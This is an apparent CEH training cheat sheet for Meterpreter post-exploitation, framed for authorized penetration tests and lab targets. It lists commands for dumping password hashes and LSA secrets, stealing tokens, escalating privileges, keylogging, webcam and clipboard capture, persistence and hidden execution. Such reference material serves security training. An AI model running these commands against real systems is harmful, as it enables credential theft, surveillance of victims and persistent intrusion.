# Meterpreter Commands Cheat Sheet

> **Module:** CEH v13 – Module 06 (System Hacking)
>
> **Tool:** Meterpreter (Metasploit Payload)
>
> **Objective:** Learn essential Meterpreter commands for post-exploitation during authorized penetration tests.

---

# What is Meterpreter?

Meterpreter (Meta-Interpreter) is an advanced payload provided by the **Metasploit Framework**.

Unlike a traditional shell, Meterpreter runs **in memory**, providing advanced post-exploitation capabilities without writing files to disk.

It allows penetration testers to:

- Enumerate systems
- Upload and download files
- Gather credentials
- Capture screenshots
- Migrate processes
- Maintain sessions
- Perform post-exploitation tasks

---

# Meterpreter Workflow

```text
Exploit Target
       │
       ▼
Meterpreter Session Opened
       │
       ▼
System Enumeration
       │
       ▼
Privilege Escalation
       │
       ▼
Credential Access
       │
       ▼
Post Exploitation
       │
       ▼
Documentation
```

---

# Opening a Meterpreter Session

Interact with a session

```bash
sessions -i 1
```

List all sessions

```bash
sessions
```

Kill session

```bash
sessions -k 1
```

Background session

```bash
background
```

---

# Help

Show all commands

```bash
help
```

---

# System Information

Current User

```bash
getuid
```

System Information

```bash
sysinfo
```

Hostname

```bash
hostname
```

Operating System

```bash
sysinfo
```

Architecture

```bash
sysinfo
```

---

# File System Commands

Current Directory

```bash
pwd
```

List Files

```bash
ls
```

Change Directory

```bash
cd Desktop
```

Create Directory

```bash
mkdir test
```

Remove Directory

```bash
rmdir test
```

Delete File

```bash
rm file.txt
```

Display File

```bash
cat file.txt
```

Search Files

```bash
search -f passwords.txt
```

---

# File Transfer

Download File

```bash
download secret.txt
```

Download Directory

```bash
download Documents
```

Upload File

```bash
upload shell.exe
```

Upload Directory

```bash
upload tools/
```

---

# Process Management

List Processes

```bash
ps
```

Kill Process

```bash
kill PID
```

Migrate to Another Process

```bash
migrate PID
```

Execute Program

```bash
execute -f cmd.exe
```

Execute Hidden

```bash
execute -f cmd.exe -H
```

---

# Shell Commands

Spawn System Shell

```bash
shell
```

Exit Shell

```bash
exit
```

Return to Meterpreter

```
CTRL + Z
```

---

# Network Enumeration

Network Interfaces

```bash
ipconfig
```

Routing Table

```bash
route
```

ARP Table

```bash
arp
```

Current Connections

```bash
netstat
```

---

# User Enumeration

Current User

```bash
getuid
```

Logged-in Users

```bash
enum_logged_on_users
```

User SID

```bash
getsid
```

---

# Privilege Escalation

Check Privileges

```bash
getprivs
```

Attempt Privilege Escalation (Windows)

```bash
getsystem
```

Steal Token

```bash
steal_token PID
```

Drop Token

```bash
drop_token
```

---

# Password Hashes

Dump Hashes

```bash
hashdump
```

LSA Secrets

```bash
lsa_dump_secrets
```

SAM Database

```bash
hashdump
```

---

# Screenshots

Capture Screenshot

```bash
screenshot
```

Record Webcam (if available)

```bash
webcam_snap
```

List Webcams

```bash
webcam_list
```

---

# Keylogger

Start Keylogger

```bash
keyscan_start
```

Dump Keystrokes

```bash
keyscan_dump
```

Stop Keylogger

```bash
keyscan_stop
```

---

# Clipboard

Read Clipboard

```bash
clipboard_get
```

Set Clipboard

```bash
clipboard_set
```

---

# Persistence

Persistence Module

```bash
run persistence
```

> **Note:** Use persistence mechanisms only in authorized lab or assessment environments.

---

# Port Forwarding

Forward Port

```bash
portfwd add -l 8080 -p 80 -r TARGET
```

List Rules

```bash
portfwd list
```

Delete Rule

```bash
portfwd delete
```

---

# Meterpreter Scripts

List Scripts

```bash
run
```

Example

```bash
run post/windows/gather/checkvm
```

---

# Useful Post Modules

```bash
post/windows/gather/hashdump
```

```bash
post/linux/gather/enum_configs
```

```bash
post/multi/manage/shell_to_meterpreter
```

---

# Session Management

Background Session

```bash
background
```

List Sessions

```bash
sessions
```

Interact

```bash
sessions -i 1
```

Kill Session

```bash
sessions -k 1
```

---

# Common Meterpreter Commands

| Command | Purpose |
|----------|----------|
| help | Help Menu |
| pwd | Current Directory |
| ls | List Files |
| cd | Change Directory |
| upload | Upload File |
| download | Download File |
| cat | Read File |
| rm | Delete File |
| mkdir | Create Directory |
| ps | Running Processes |
| migrate | Process Migration |
| shell | Spawn Shell |
| getuid | Current User |
| sysinfo | System Information |
| ipconfig | Network Information |
| route | Routing Table |
| hashdump | Dump Password Hashes |
| screenshot | Capture Screen |
| keyscan_start | Start Keylogger |
| keyscan_dump | View Keys |
| background | Background Session |
| exit | Close Session |

---

# Real Lab Examples

## Metasploitable 2

```bash
sysinfo

getuid

pwd

ls

shell
```

---

## Mr. Robot

After obtaining a Meterpreter session:

```bash
sysinfo

getuid

ls

download password.raw-md5

shell
```

---

## Windows Target

```bash
hashdump

getsystem

screenshot

ps

migrate
```

---

# Best Practices

✔ Gather system information before making changes.

✔ Download evidence instead of modifying files where possible.

✔ Record commands executed for reporting.

✔ Migrate into stable processes when appropriate.

✔ Clean up any artifacts created during authorized engagements.

---

# Interview Questions

## What is Meterpreter?

Meterpreter is an advanced in-memory payload within the Metasploit Framework that provides interactive post-exploitation capabilities.

---

## Which command displays system information?

```bash
sysinfo
```

---

## Which command lists running processes?

```bash
ps
```

---

## Which command opens a system shell?

```bash
shell
```

---

## Which command dumps password hashes?

```bash
hashdump
```

---

## Which command captures a screenshot?

```bash
screenshot
```

---

## Which command backgrounds a Meterpreter session?

```bash
background
```

---

## Which command migrates to another process?

```bash
migrate PID
```

---

# CEH Exam Tips

✔ Meterpreter is an **advanced post-exploitation payload**, not an exploit.

✔ Be familiar with system enumeration, process management, and file transfer commands.

✔ Understand the purpose of `getuid`, `sysinfo`, `hashdump`, `migrate`, and `background`.

✔ Always document actions performed during an engagement.

---

# Key Takeaways

- Meterpreter provides a powerful in-memory shell for post-exploitation.
- It supports enumeration, file management, credential access, process manipulation, and network inspection.
- Mastering the core Meterpreter commands is essential for CEH practical labs and real-world penetration testing workflows.

---

## Related Notes

- `08-Metasploit-System-Hacking.md`
- `10-Privilege-Escalation-Windows.md`
- `11-Privilege-Escalation-Linux.md`
- `14-Post-Exploitation-Checklist.md`
- `20-Cheat-Sheet.md`
